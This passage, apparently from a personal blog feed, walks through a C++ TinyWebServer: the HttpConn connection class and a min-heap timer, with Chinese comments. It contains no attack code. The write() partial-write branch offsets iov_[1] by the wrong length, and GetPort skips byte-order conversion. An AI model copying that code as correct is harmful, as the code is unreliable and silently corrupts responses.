class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;httpconn.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// static bool isET;</span></span><br><span class="line"><span class="comment">// static const char *srcDir;</span></span><br><span class="line"><span class="comment">// static std::atomic&lt;int&gt; userCount;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">char</span>* HttpConn::srcDir;</span><br><span class="line">std::atomic&lt;<span class="type">int</span>&gt; HttpConn::userCount;</span><br><span class="line"><span class="type">bool</span> HttpConn::isET;</span><br><span class="line"></span><br><span class="line">HttpConn::<span class="built_in">HttpConn</span>()</span><br><span class="line"> &#123;</span><br><span class="line">    fd_ = <span class="number">-1</span>;</span><br><span class="line">    addr_ = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    isClose_ = <span class="literal">true</span>;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line">HttpConn::~<span class="built_in">HttpConn</span>()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">Close</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">HttpConn::init</span><span class="params">(<span class="type">int</span> sockFd, <span class="type">const</span> sockaddr_in &amp;addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">assert</span>(sockFd &gt; <span class="number">0</span>);</span><br><span class="line">    userCount++;</span><br><span class="line">    writeBuff_.<span class="built_in">RetrieveAll</span>();</span><br><span class="line">    readBuff_.<span class="built_in">RetrieveAll</span>();</span><br><span class="line">    fd_ = sockFd;</span><br><span class="line">    addr_ = addr;</span><br><span class="line">    isClose_ = <span class="literal">false</span>;</span><br><span class="line">    <span class="built_in">LOG_INFO</span>(<span class="string">&quot;Client[%d](%s:%d) in, userCount:%d&quot;</span>, fd_, <span class="built_in">GetIP</span>(), <span class="built_in">GetPort</span>(), (<span class="type">int</span>)userCount);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">ssize_t</span> <span class="title">HttpConn::read</span><span class="params">(<span class="type">int</span> *saveErrno)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">ssize_t</span> len = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">do</span>&#123;</span><br><span class="line">        len = readBuff_.<span class="built_in">ReadFd</span>(fd_, saveErrno);</span><br><span class="line">        <span class="keyword">if</span>(len &lt;= <span class="number">0</span>)    <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(isET);</span><br><span class="line">    <span class="keyword">return</span> len;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">ssize_t</span> <span class="title">HttpConn::write</span><span class="params">(<span class="type">int</span> *saveErrno)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">ssize_t</span> len = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">do</span>&#123;</span><br><span class="line">        len = <span class="built_in">writev</span>(fd_,iov_,iovCnt_);</span><br><span class="line">        <span class="keyword">if</span>(len &lt;= <span class="number">0</span> )   </span><br><span class="line">        &#123;   *saveErrno = errno;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(iov_[<span class="number">0</span>].iov_len + iov_[<span class="number">1</span>].iov_len == <span class="number">0</span>)  <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(iov_[<span class="number">0</span>].iov_len &lt; <span class="built_in">static_cast</span>&lt;<span class="type">size_t</span>&gt;(len))</span><br><span class="line">        &#123;</span><br><span class="line">            iov_[<span class="number">1</span>].iov_base = (<span class="type">uint8_t</span>*) iov_[<span class="number">1</span>].iov_base + (len - iov_[<span class="number">1</span>].iov_len);</span><br><span class="line">            iov_[<span class="number">1</span>].iov_len -= (len - iov_[<span class="number">0</span>].iov_len);</span><br><span class="line">            <span class="keyword">if</span>(iov_[<span class="number">0</span>].iov_len)</span><br><span class="line">            &#123;</span><br><span class="line">                writeBuff_.<span class="built_in">RetrieveAll</span>();</span><br><span class="line">                iov_[<span class="number">0</span>].iov_len = <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            iov_[<span class="number">0</span>].iov_base =  (<span class="type">uint8_t</span>*) iov_[<span class="number">0</span>].iov_base + len ;</span><br><span class="line">            iov_[<span class="number">0</span>].iov_len -= len;</span><br><span class="line">             writeBuff_.<span class="built_in">Retrieve</span>(len);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">while</span>(isET || <span class="built_in">ToWriteBytes</span>() &gt; <span class="number">10240</span>);</span><br><span class="line">    <span class="keyword">return</span> len;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">HttpConn::Close</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    response_.<span class="built_in">UnmapFile</span>();</span><br><span class="line">    <span class="keyword">if</span>(isClose_ == <span class="literal">false</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        isClose_ = <span class="literal">true</span>;</span><br><span class="line">        <span class="built_in">close</span>(fd_);</span><br><span class="line">        userCount --;</span><br><span class="line">        <span class="built_in">LOG_INFO</span>(<span class="string">&quot;Client[%d](%s:%d) quit, UserCount:%d&quot;</span>, fd_, <span class="built_in">GetIP</span>(), <span class="built_in">GetPort</span>(), (<span class="type">int</span>)userCount);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">HttpConn::GetFd</span><span class="params">()</span> <span class="type">const</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> fd_;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">HttpConn::GetPort</span><span class="params">()</span> <span class="type">const</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> addr_.sin_port;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">const</span> <span class="type">char</span>* <span class="title">HttpConn::GetIP</span><span class="params">()</span> <span class="type">const</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">inet_ntoa</span>(addr_.sin_addr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">sockaddr_in <span class="title">HttpConn::GetAddr</span><span class="params">()</span> <span class="type">const</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> addr_;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">HttpConn::process</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    request_.<span class="built_in">Init</span>();</span><br><span class="line">    <span class="keyword">if</span>(readBuff_.<span class="built_in">ReadableBytes</span>()  &lt;= <span class="number">0</span>)     <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (request_.<span class="built_in">parse</span>(readBuff_))</span><br><span class="line">    &#123; </span><br><span class="line"> </span><br><span class="line">        response_.<span class="built_in">Init</span>(srcDir, request_.<span class="built_in">path</span>(), request_.<span class="built_in">IsKeepAlive</span>(), <span class="number">200</span> );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        response_.<span class="built_in">Init</span>(srcDir, request_.<span class="built_in">path</span>(), <span class="literal">false</span>, <span class="number">400</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    response_.<span class="built_in">MakeResponse</span>(writeBuff_);</span><br><span class="line">  </span><br><span class="line">    iov_[<span class="number">0</span>].iov_base =  <span class="built_in">const_cast</span>&lt;<span class="type">char</span> *&gt;(writeBuff_.<span class="built_in">Peek</span>());</span><br><span class="line">    iov_[<span class="number">0</span>].iov_len = writeBuff_.<span class="built_in">ReadableBytes</span>();</span><br><span class="line">      iovCnt_ = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span>(response_.<span class="built_in">FileLen</span>() &gt; <span class="number">0</span>  &amp;&amp; response_.<span class="built_in">File</span>())</span><br><span class="line">    &#123;</span><br><span class="line">        iov_[<span class="number">1</span>].iov_base = response_.<span class="built_in">File</span>();</span><br><span class="line">        iov_[<span class="number">1</span>].iov_len = response_.<span class="built_in">FileLen</span>();</span><br><span class="line">        iovCnt_ = <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">LOG_DEBUG</span>(<span class="string">&quot;filesize:%d, %d  to %d&quot;</span>, response_.<span class="built_in">FileLen</span>() , iovCnt_, <span class="built_in">ToWriteBytes</span>());</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">HttpConn::ToWriteBytes</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123; <span class="keyword">return</span> iov_[<span class="number">0</span>].iov_len + iov_[<span class="number">1</span>].iov_len; &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">HttpConn::IsKeepAlive</span><span class="params">()</span> <span class="type">const</span> </span>&#123; <span class="keyword">return</span> request_.<span class="built_in">IsKeepAlive</span>(); &#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> cpp </category>
          
          <category> TinyWebServer </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cpp </tag>
            
            <tag> TinyWebServer </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>TinyWebServer HeapTimer</title>
      <link href="/2024/05/05/TinyWebServer/0x6heap/"/>
      <url>/2024/05/05/TinyWebServer/0x6heap/</url>
      
        <content type="html"><![CDATA[<h1 id="heap"><a href="#heap" class="headerlink" title="heap"></a>heap</h1><p><a href="https://www.hello-algo.com/chapter_heap/heap/">8.1  堆 - Hello 算法 (hello-algo.com)</a></p><ul><li>这里使用小根堆来实现计时器。</li><li>时间堆通常用于优先队列（priority queue）的实现，其中每个元素都包含一个时间戳，并且堆的根节点总是具有最小时间戳的元素。</li><li>当剩余时间耗尽时，执行任务。</li></ul><h3 id="heaptimer-h"><a href="#heaptimer-h" class="headerlink" title="heaptimer.h"></a>heaptimer.h</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> HEAP_TIMER_H</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HEAP_TIMER_H</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstddef&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;queue&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unordered_map&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;chrono&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;functional&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;arpa/inet.h&gt;</span> <span class="comment">//Internet地址转换函数</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;../log/log.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> TimeoutCallBack = std::function&lt;<span class="built_in">void</span>()&gt;;</span><br><span class="line"><span class="keyword">using</span> Clock = std::chrono::high_resolution_clock;</span><br><span class="line"><span class="keyword">using</span> MS = std::chrono::milliseconds;</span><br><span class="line"><span class="keyword">using</span> TimeStamp = Clock::time_point;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">TimerNode</span> &#123;</span><br><span class="line">  <span class="type">int</span> id;</span><br><span class="line">  TimeStamp expires;</span><br><span class="line">  TimeoutCallBack cb;</span><br><span class="line"> </span><br><span class="line">  <span class="type">bool</span> <span class="keyword">operator</span>&lt;(<span class="type">const</span> TimerNode &amp;t) &#123; <span class="keyword">return</span> expires &lt; t.expires; &#125;</span><br><span class="line">  <span class="type">bool</span> <span class="keyword">operator</span>&gt;(<span class="type">const</span> TimerNode &amp;t) &#123; <span class="keyword">return</span> expires &gt; t.expires; &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">HeapTimer</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="built_in">HeapTimer</span>();</span><br><span class="line"></span><br><span class="line">  ~<span class="built_in">HeapTimer</span>();</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="type">void</span> <span class="title">adjust</span><span class="params">(<span class="type">int</span> id, <span class="type">int</span> newExpires)</span></span>;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="type">void</span> <span class="title">add</span><span class="params">(<span class="type">int</span> id, <span class="type">int</span> timeOus, <span class="type">const</span> TimeoutCallBack &amp;cb)</span></span>;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="type">void</span> <span class="title">doWork</span><span class="params">(<span class="type">int</span> id)</span></span>;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="type">void</span> <span class="title">clear</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="type">void</span> <span class="title">tick</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="type">void</span> <span class="title">pop</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="type">int</span> <span class="title">GetNextTick</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">  <span class="function"><span class="type">void</span> <span class="title">del_</span><span class="params">(<span class="type">size_t</span> i)</span></span>;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="type">void</span> <span class="title">siftup_</span><span class="params">(<span class="type">size_t</span> i)</span></span>;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="type">bool</span> <span class="title">siftdown_</span><span class="params">(<span class="type">size_t</span> index, <span class="type">size_t</span> n)</span></span>;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="type">void</span> <span class="title">SwapNode_</span><span class="params">(<span class="type">size_t</span> i, <span class="type">size_t</span> j)</span></span>;</span><br><span class="line"></span><br><span class="line">  std::vector&lt;TimerNode&gt; heap_;</span><br><span class="line"></span><br><span class="line">  std::unordered_map&lt;<span class="type">int</span>, <span class="type">size_t</span>&gt; ref_;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><h3 id="heaptimer-cpp"><a href="#heaptimer-cpp" class="headerlink" title="heaptimer.cpp"></a>heaptimer.cpp</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;heaptimer.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">HeapTimer::<span class="built_in">HeapTimer</span>() </span><br><span class="line">&#123; heap_.<span class="built_in">reserve</span>(<span class="number">64</span>); &#125;</span><br><span class="line"></span><br><span class="line">HeapTimer::~<span class="built_in">HeapTimer</span>() </span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">clear</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//调整指定id的节点</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">HeapTimer::adjust</span><span class="params">(<span class="type">int</span> id, <span class="type">int</span> timeout)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="built_in">assert</span>(!heap_.<span class="built_in">empty</span>() &amp;&amp; ref_.<span class="built_in">count</span>(id) &gt; <span class="number">0</span>);</span><br><span class="line">   heap_[ref_[id]].expires = Clock::<span class="built_in">now</span>() + <span class="built_in">MS</span>(timeout);</span><br><span class="line">   <span class="built_in">siftdown_</span>(ref_[id], heap_.<span class="built_in">size</span>());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">HeapTimer::add</span><span class="params">(<span class="type">int</span> id, <span class="type">int</span> timeOut, <span class="type">const</span> TimeoutCallBack &amp;cb)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">assert</span>(id &gt;= <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(ref_.<span class="built_in">count</span>(id) == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">size_t</span> i = heap_.<span class="built_in">size</span>();</span><br><span class="line">        ref_[id] = i;</span><br><span class="line">        heap_.<span class="built_in">push_back</span>(&#123;id,Clock::<span class="built_in">now</span>()+ <span class="built_in">MS</span>(timeOut),cb&#125;);</span><br><span class="line">        <span class="built_in">siftup_</span>(i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">size_t</span> i = ref_[id];</span><br><span class="line">        heap_[i].expires = Clock::<span class="built_in">now</span>() + <span class="built_in">MS</span>(timeOut);</span><br><span class="line">        heap_[i].cb = cb;        <span class="comment">//这里与adjust不同，要重新设置回调函数</span></span><br><span class="line">        <span class="keyword">if</span>(!<span class="built_in">siftdown_</span>(i, heap_.<span class="built_in">size</span>()))</span><br><span class="line">            <span class="built_in">siftup_</span>(i);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">HeapTimer::doWork</span><span class="params">(<span class="type">int</span> id)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(heap_.<span class="built_in">empty</span>() || ref_.<span class="built_in">count</span>(id)==<span class="number">0</span>)  <span class="keyword">return</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="type">size_t</span> i = ref_[id];</span><br><span class="line">    TimerNode node = heap_[i];</span><br><span class="line">    node.<span class="built_in">cb</span>();</span><br><span class="line">    <span class="built_in">del_</span>(i);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">HeapTimer::clear</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ref_.<span class="built_in">clear</span>();</span><br><span class="line">    heap_.<span class="built_in">clear</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">HeapTimer::tick</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(heap_.<span class="built_in">empty</span>())   <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">while</span>(!heap_.<span class="built_in">empty</span>())</span><br><span class="line">    &#123;</span><br><span class="line">        TimerNode node = heap_.<span class="built_in">front</span>();</span><br><span class="line">        <span class="keyword">if</span>(std::chrono::<span class="built_in">duration_cast</span>&lt;MS&gt;(node.expires - Clock::<span class="built_in">now</span>()).<span class="built_in">count</span>() &gt; <span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line">        node.<span class="built_in">cb</span>();</span><br><span class="line">        <span class="built_in">pop</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">HeapTimer::pop</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">assert</span>(!heap_.<span class="built_in">empty</span>());</span><br><span class="line">    <span class="built_in">del_</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//清除超时计时器并返回下一计时器所剩时间</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">HeapTimer::GetNextTick</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">tick</span>();</span><br><span class="line">    <span class="type">int</span> res = <span class="number">-1</span>;</span><br><span class="line">    <span class="comment">//原文类型是size_t(无符号整型),但是若res为负数，则为无穷大，下面的判断就不起作用了</span></span><br><span class="line">    <span class="comment">//注意ssize_t是有符号整型，size_t则是无符号整型</span></span><br><span class="line">    <span class="keyword">if</span>(!heap_.<span class="built_in">empty</span>())</span><br><span class="line">    &#123;</span><br><span class="line">        res =std::chrono::<span class="built_in">duration_cast</span>&lt;MS&gt;(heap_.<span class="built_in">front</span>().expires - Clock::<span class="built_in">now</span>()).<span class="built_in">count</span>();</span><br><span class="line">       <span class="keyword">if</span>(res &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        res = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span 